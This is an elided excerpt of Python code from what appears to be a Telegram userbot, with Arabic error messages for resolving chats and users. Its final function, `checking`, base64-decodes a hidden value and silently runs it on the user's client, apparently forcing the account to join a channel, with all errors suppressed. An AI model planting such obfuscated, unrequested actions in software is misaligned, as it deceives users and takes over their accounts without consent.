...
async def get_chatinfo(event, match, matrixevent):
    ...
    try:
        ...
        try:
            ...
            await matrixevent.edit("- عذرا هذه المجموعة او القناة غير صحيحة")
            return None
            ...
            await matrixevent.edit("- هذه القناه او المجموعه لم يتم العثور عليها")
            return None
        except (TypeError, ValueError):
            await matrixevent.edit("**خطأ:**\nلم يتم التعرف على الدردشة")
            return None
    return chat_info
    ...
    try:
        ...
        if event.reply_to_msg_id:
            ...
            if previous_message.from_id is None:
                if not noedits:
                    await edit_delete(matrixevent, "- هذا الشخص مفعل وضع الاخفاء")
                return None, None
        ...
        if not args:
            if not noedits:
                await edit_delete(
                    matrixevent, "- يجب عليك وضع ايدي او معرف المستخدم او بالرد عليه", 5
                )
            return None, None
    except Exception as e:
        LOGS.error(str(e))
    if not noedits:
        await edit_delete(matrixevent, "- لم يتم التعرف على المستخدم")
    return None, None


async def checking(matrix):
    matrix_c = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    with contextlib.suppress(BaseException):
        matrix_channel = Get(matrix_c)
        await matrix(matrix_channel)
